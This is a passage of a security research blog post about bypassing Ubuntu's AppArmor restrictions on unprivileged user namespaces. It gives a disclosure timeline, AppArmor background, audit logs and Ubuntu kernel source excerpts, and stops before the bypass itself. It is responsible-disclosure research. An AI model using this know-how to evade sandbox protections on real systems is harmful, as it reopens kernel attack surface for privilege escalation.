&lt;p&gt;Recently, Ubuntu introduced sandbox mechanisms to reduce the attack surface, and they seemed unbreakable. However, after carrying out in-depth research, we found that the implementation contained some issues, and bypassing it was not as difficult as expected. This post will explain how we began our research at the kernel level and discovered a bypass method. We will also share some interesting stories from the process.&lt;/p&gt;

&lt;h2 id=&quot;1-introduction&quot;&gt;1. Introduction&lt;/h2&gt;

&lt;h3 id=&quot;11-ubuntus-new-sandbox-model&quot;&gt;1.1. Ubuntu’s New Sandbox Model&lt;/h3&gt;

&lt;p&gt;After years of serving as a rich attack surface for privilege escalation, unprivileged user namespaces finally started receiving serious attention. In April 2024, shortly after that year’s Pwn2Own, Ubuntu published a &lt;a href=&quot;https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts&quot;&gt;security-focused blog post&lt;/a&gt; announcing new mitigations designed to lock down unprivileged namespaces and io_uring. The goal was clear: to ensure that untrusted applications run within a tighter, more controlled sandbox. These restrictions were largely implemented through AppArmor.&lt;/p&gt;

&lt;p&gt;Fast forward to September 2024, Ubuntu followed up with a &lt;a href=&quot;https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf&quot;&gt;presentation&lt;/a&gt; introducing their sandbox architecture in more depth. The slides outlined not only the motivation behind the design but also provided a breakdown of how the sandbox operates under the hood.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_42ba484ec23b76cbbb9a0d60184bf5d1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From these updates, it became evident that Ubuntu’s new model only allows specific applications to create unprivileged namespaces. All other, untrusted processes are blocked. Without access to unprivileged namespaces, attackers lose their entry point to subsystems like netfilter and net/sched — historically fertile ground for discovering vulnerabilities. At first, this seemed like a bulletproof defense. Some researchers even speculated that Ubuntu, formerly the only Linux LPE target at Pwn2Own, might now be effectively unbreakable.&lt;/p&gt;

&lt;h3 id=&quot;12-emergence-of-the-bypass-method&quot;&gt;1.2. Emergence of the Bypass Method&lt;/h3&gt;

&lt;p&gt;But then, on February 16, something unexpected happened. I stumbled across a Twitter thread where someone claimed that the new AppArmor-based protections could be bypassed. Seriously? That got my attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_aa9dd31f3f5a20bfe166d06729f5544e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Coincidentally, Pwn2Own 2025 was just around the corner. It felt like the perfect time to start digging. I decided to analyze how Ubuntu enforces these restrictions via AppArmor — and more importantly, whether there were any cracks in the armor.&lt;/p&gt;

&lt;p&gt;To my surprise, it didn’t take long. Within a few hours of reviewing the code, I found a way to bypass them! It wasn’t even particularly difficult to find it, as long as the investigation was conducted in the right direction. With unprivileged namespaces now back on the table, the next step in my plan was straightforward: find a vulnerability in a module of the network subsystem that Ubuntu enables by default but kernelCTF does not. Couldn’t be better!&lt;/p&gt;

&lt;p&gt;Unfortunately, things didn’t go so well. Just a week later, on February 24, the official rules for Pwn2Own Berlin were announced, and Ubuntu was off the table because the Linux LPE target was changed to Red Hat Enterprise Linux. To make things worse (for the bypass, at least), RHEL doesn’t restrict unprivileged namespaces at all. Which meant… my bypass was now irrelevant to the competition.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_58836702284ef31386e2d2f737ef8883.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;13-vendor-response&quot;&gt;1.3. Vendor Response&lt;/h3&gt;

&lt;p&gt;Upon learning that Ubuntu was no longer a Pwn2Own target, I promptly submitted the issue through the ZDI portal, the platform I usually use for vulnerability reporting. But while I waited for a response, the &lt;a href=&quot;https://x.com/roddux/status/1903028631514837107&quot;&gt;researcher (@roddux)&lt;/a&gt; posted a bypass method on Twitter on March 21. Later, on March 27, the Qualys Team released a &lt;a href=&quot;https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt&quot;&gt;disclosure&lt;/a&gt; that included more detailed technical explanations. All of these methods are based on a similar root cause as the one I identified.&lt;/p&gt;

&lt;p&gt;As a researcher, it was frustrating to see various bypass methods being publicly disclosed while I couldn’t share my own work because I had already reported it to ZDI. After a few days with no updates, I even emailed ZDI to ask if I could withdraw my submission. Thankfully, my boss, Orange Tsai, stepped in just in time and patiently walked me through the pros and cons of doing so. That helped me regain my composure, and I ended up sending another email to retract my withdrawal request.&lt;/p&gt;

&lt;p&gt;On April 27, the ZDI team finally reviewed my report, but they said they were not interested in the issue. So, I decided to report it directly to the Ubuntu Security Team. Within a day, I received a quick response from John, one of the maintainers of the namespace restriction mechanism. He said they were verifying the issue and would notify me of any updates. By the way, this was my first time reporting an issue to the Ubuntu Security Team, and their responsiveness and friendliness made it a great experience to collaborate with them.&lt;/p&gt;

&lt;p&gt;After about a month of discussion, they finally determined that the issue I reported was a variant of the bypass methods previously disclosed by the Qualys Team. It only works when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; is disabled, which has been enabled by default since Ubuntu 25.04. They had also recommended that users disable it in earlier versions through their &lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;official post&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This post documents my bypass technique and the full disclosure timeline. While the core idea aligns with previously published methods, I believe it is still worth publishing because the method was discovered from a kernel side rather than from userspace. I hope every reader enjoys it!&lt;/p&gt;

&lt;h2 id=&quot;2-apparmor-101&quot;&gt;2. AppArmor 101&lt;/h2&gt;

&lt;h3 id=&quot;21-overview&quot;&gt;2.1. Overview&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;AppArmor (Application Armor)&lt;/strong&gt; is an implementation of a Linux Security Module (LSM) that provides Mandatory Access Control (MAC), restricting processes’ access to system resources. Administrators can define an AppArmor profile for a program to limit its capabilities. If a process does not have an AppArmor profile, it runs in &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile&lt;/strong&gt;, meaning AppArmor does not impose any restrictions on it.&lt;/p&gt;

&lt;p&gt;Each profile defines access control for an individual program, specifying which files, capabilities, and network permissions it can access. Enabled profiles can operate in two modes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Enforced mode&lt;/strong&gt;: Violating behavior is blocked and logged.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Complain mode&lt;/strong&gt;: Violating behavior is only logged but not blocked.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example profile:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/ipa_verify&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profile ipa_verify&lt;/code&gt;: Defines a profile named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipa_verify&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt;: The profile applies to the binary located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt;. When executed, this profile is automatically loaded.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags=(unconfined)&lt;/code&gt;: This profile is in unconfined status. Although the profile is loaded, it does not restrict the application’s behavior.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userns&lt;/code&gt;: Allows the application to use user namespaces.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Users can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; tool to list active profiles and their statuses. Below is an example JSON output:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
    &quot;version&quot;: &quot;2&quot;,
    &quot;profiles&quot;: {
        &quot;/snap/snapd/23258/usr/lib/snapd/snap-confine&quot;: &quot;enforce&quot;,
        &quot;/usr/sbin/sssd&quot;: &quot;complain&quot;,
        &quot;Discord&quot;: &quot;unconfined&quot;
    },
    &quot;processes&quot;: {
        &quot;/usr/sbin/rsyslogd&quot;: [
            {
                &quot;profile&quot;: &quot;rsyslogd&quot;,
                &quot;pid&quot;: &quot;1176&quot;,
                &quot;status&quot;: &quot;enforce&quot;
            }
        ]
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-behavior-in-ubuntu&quot;&gt;2.2. Behavior in Ubuntu&lt;/h3&gt;

&lt;p&gt;Users can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt; tool to execute target binary under an unprivileged user namespace. However, after the introduction of new security mechanisms, executing this command on Ubuntu results in an &lt;strong&gt;“Operation not permitted” (-EPERM)&lt;/strong&gt; error.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unshare &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; /bin/bash
unshare: write failed /proc/self/uid_map: Operation not permitted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, if we check the kernel log using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; command, we will see some event logs related to AppArmor.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;dmesg
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.394909] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.573:545&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AUDIT&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;namespace&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unconfined&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;requested&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.395747] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.574:546&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DENIED&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;capable&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cap&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;capability&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21  &lt;span class=&quot;nv&quot;&gt;capname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sys_admin&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ol&gt;
  &lt;li&gt;First AppArmor Event - Audit Event
    &lt;ul&gt;
      &lt;li&gt;This event logs execution details.&lt;/li&gt;
      &lt;li&gt;The event describes that a process with PID 29466 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt;) attempted to create a user namespace (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operation=&quot;userns_create&quot;&lt;/code&gt;).&lt;/li&gt;
      &lt;li&gt;The process is currently unrestricted (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profile=&quot;unconfined&quot;&lt;/code&gt;), meaning it’s not bound to any AppArmor profile at the moment.&lt;/li&gt;
      &lt;li&gt;After this event, the process is assigned the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Second AppArmor Event - Deny Event
    &lt;ul&gt;
      &lt;li&gt;This event indicates a denied operation.&lt;/li&gt;
      &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile restricts the process from using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt; capability.&lt;/li&gt;
      &lt;li&gt;Since unshare requires &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt; to create a new user namespace, AppArmor blocks the operation, leading to the &lt;strong&gt;“Operation not permitted (-EPERM)”&lt;/strong&gt; error.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In Ubuntu, all AppArmor profiles are stored in the directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /etc/apparmor.d/
total 528
drwxr-xr-x   9 root root  4096 Feb 17 10:46 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   354 Oct  2 07:24 1password
...
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   699 Oct  2 07:24 unprivileged_userns
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt; defines the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile. Below is part of the file’s content:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

profile unprivileged_userns {
     audit deny capability,
     audit deny change_profile,

     [...]
     allow mqueue,
     allow ptrace,
     allow userns,
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second event log we saw in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; output comes from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audit deny capability&lt;/code&gt; rule. This rule blocks all operations that require capabilities such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_CHOWN&lt;/code&gt;, and logs any denied requests.&lt;/p&gt;

&lt;p&gt;Now that we understand creating a namespace is not allowed under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile, a key question arises:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why is our process, which starts in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile, automatically transitioned to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To answer this, we need to dive into the AppArmor implementation in Ubuntu!&lt;/p&gt;

&lt;h2 id=&quot;3-investigating-ubuntu-kernel-patch&quot;&gt;3. Investigating Ubuntu Kernel Patch&lt;/h2&gt;

&lt;h3 id=&quot;31-analysis-strategy&quot;&gt;3.1. Analysis Strategy&lt;/h3&gt;

&lt;p&gt;Each Linux distribution modifies the Linux kernel based on its own needs, and Ubuntu is no exception.&lt;/p&gt;

&lt;p&gt;When analyzing the Ubuntu source, you will download two files: the base version of the Linux source code (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;.orig.tar.gz&lt;/code&gt;) and a diff file containing Ubuntu’s modifications (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;-&amp;lt;x&amp;gt;.&amp;lt;y&amp;gt;.diff.gz&lt;/code&gt;, where x represents Ubuntu’s maintained subversion, and y is usually a minor or patch release). To analyze Ubuntu’s customizations, the patched source code is usually examined alongside the diff file.&lt;/p&gt;

&lt;p&gt;However, taking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_6.11.0-18.18.diff&lt;/code&gt; as an example, the patch contains over 260000 lines - so where should one begin?&lt;/p&gt;

&lt;p&gt;We can narrow the direction based on heuristics: the unusual behavior of AppArmor is only triggered by the &lt;strong&gt;unshare operation&lt;/strong&gt;. Additionally, &lt;strong&gt;certain strings in the audit event logs&lt;/strong&gt; can be searched to quickly locate key operations.&lt;/p&gt;

&lt;h3 id=&quot;32-diving-into-the-source&quot;&gt;3.2. Diving Into the Source&lt;/h3&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_userns_create()&lt;/code&gt; is triggered as an AppArmor hook and is executed when a namespace is created [1]. This function then calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; to handle namespace permission-related settings  [2].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;begin_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aa_unprivileged_userns_restricted&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* default value: 1 */&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_mediates&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CLASS_NS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
                           &lt;span class=&quot;n&quot;&gt;AA_USERNS_CREATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; detects that the profile is &lt;strong&gt;in unconfined status&lt;/strong&gt; [3] and that the currently used profile matches the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile&lt;/strong&gt; [4], it directly applies a hardcoded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile [5], which corresponds to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt;. This is the AppArmor profile that prevents us from creating unprivileged namespaces.&lt;/p&gt;

&lt;p&gt;The following code only includes a portion of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; function. The full code contains numerous comments with &lt;strong&gt;“TODO”&lt;/strong&gt; and &lt;strong&gt;“hardcode”&lt;/strong&gt;, indicating that the entire mechanism is still under development.&lt;/p&gt;

